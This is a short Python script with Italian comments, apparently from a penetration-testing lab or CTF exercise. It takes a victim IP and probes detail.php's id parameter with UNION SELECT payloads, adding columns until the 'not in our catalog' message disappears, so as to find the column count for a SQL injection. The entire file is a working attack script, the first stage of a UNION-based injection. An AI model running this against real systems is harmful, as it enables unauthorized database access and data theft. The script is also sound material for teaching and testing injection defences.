import requests
from pwn import *

if len(sys.argv) == 2:
    ip_vittima = sys.argv[1]
else:
    print("Inserire ip della vittima come parametro:")
    print("$ python3 sql_injection_detail1.py <IP_VITTIMA>")
    exit(-1)

url = f"http://{ip_vittima}/detail.php?id="
payload = "1"
n_col = 1

# Cerchiamo di capire quante colonne restituisce la query originale della pagine detail.php
while True:
    response = requests.get(url+f"999'+UNION+SELECT+{payload}%23") # %23 = commento
    print(url+f"999'+UNION+SELECT+{payload}%23")
    if not "This product is not in our catalog" in response.text:
        break

    n_col = n_col + 1
    payload = payload +  f",{n_col}"

print(f"Il numero di colonne è {n_col}")




